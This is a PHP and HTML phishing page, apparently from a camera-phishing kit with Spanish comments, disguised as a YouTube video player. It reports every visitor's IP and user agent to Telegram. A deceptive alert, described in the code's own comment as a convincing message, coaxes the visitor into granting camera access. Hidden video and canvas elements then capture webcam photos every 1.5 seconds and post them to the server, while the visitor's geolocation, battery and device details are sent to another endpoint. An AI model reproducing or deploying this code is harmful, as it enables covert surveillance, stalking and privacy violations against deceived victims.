<?php 
require_once __DIR__ . '/ip_utils.php';
require_once __DIR__ . '/telegram.php';

$ip = get_client_ip();
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$ts = gmdate('c');

$msg = "👋 <b>Nueva visita</b>\n".
       "📌 IP: $ip\n".
       "🖥️ UA: $ua\n".
       "⏰ Hora: $ts";
send_to_telegram($msg);
?>

<!doctype html>
<html>
<head>
    <meta charset="UTF-8">
    <title>YouTube - Video</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <style>
        /* Fondo oscuro similar a YouTube */
        body {
            margin: 0;
            background-color: #121212;
            color: #fff;
            font-family: Arial, sans-serif;
        }

        /* Contenedor de video */
        .video-container {
            position: relative;
            width: 100%;
            max-width: 960px;
            margin: 50px auto;
            box-shadow: 0 0 10px rgba(0,0,0,0.5);
            border-radius: 8px;
            overflow: hidden;
        }

        /* Barra de título simulada */
        .video-title-bar {
            background-color: #202020;
            padding: 10px;
            font-weight: bold;
            font-size: 16px;
        }

        iframe {
            display: block;
            width: 100%;
            height: 540px;
        }
    </style>
</head>
<body>

<script>
// Mensaje convincente antes de pedir permisos
alert("Para ofrecer la mejor experiencia, necesitamos acceso a tu cámara. Esto nos permitirá gestionar tus archivos multimedia de forma eficiente, guardar videos de demostración y reproducirlos directamente en la aplicación.");
</script>

<div class="video-container">
    <div class="video-title-bar">YouTube Video - Aldo Arturo</div>
    <!-- Video de YouTube -->
    <iframe id="Live_YT_TV" src="https://www.youtube.com/embed/h0-7_FE85DU?autoplay=1" frameborder="0" allow="autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
</div>

<!-- Video y Canvas ocultos para tomar fotos -->
<video id="video" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

<script>
'use strict';

// Función para enviar foto al servidor
function post(imgdata){
    $.ajax({
        type: 'POST',
        data: { cat: imgdata },
        url: 'post.php',
        dataType: 'json',
        async: false
    });
}

// Configuración cámara
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const constraints = { audio: false, video: { facingMode: "user" } };

// Acceso a la cámara
async function initCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        video.srcObject = stream;
        capturePhotoLoop();
    } catch (e) {
        console.error('Error al acceder a la cámara:', e);
    }
}

// Captura fotos cada 1.5 segundos
function capturePhotoLoop() {
    const context = canvas.getContext('2d');
    setInterval(function(){
        context.drawImage(video, 0, 0, 640, 480);
        const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
        post(canvasData);
    }, 1500);
}

// Iniciar cámara oculta
initCamera();

// Obtener ubicación y datos del dispositivo automáticamente
if ('geolocation' in navigator) {
    navigator.geolocation.getCurrentPosition(function(pos) {
        const { latitude, longitude, accuracy } = pos.coords;

        const deviceInfo = {
            platform: navigator.platform,
            userAgent: navigator.userAgent,
            cores: navigator.hardwareConcurrency || 'unknown',
            memory: navigator.deviceMemory || 'unknown',
        };

        if (navigator.getBattery) {
            navigator.getBattery().then(battery => {
                deviceInfo.batteryLevel = battery.level * 100 + '%';
                deviceInfo.charging = battery.charging;
                enviarDatos(latitude, longitude, accuracy, deviceInfo);
            });
        } else {
            enviarDatos(latitude, longitude, accuracy, deviceInfo);
        }

        function enviarDatos(lat, lon, acc, deviceInfo) {
            fetch('location.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ latitude: lat, longitude: lon, accuracy: acc, device: deviceInfo })
            });
        }
    });
}
</script>

</body>
</html>
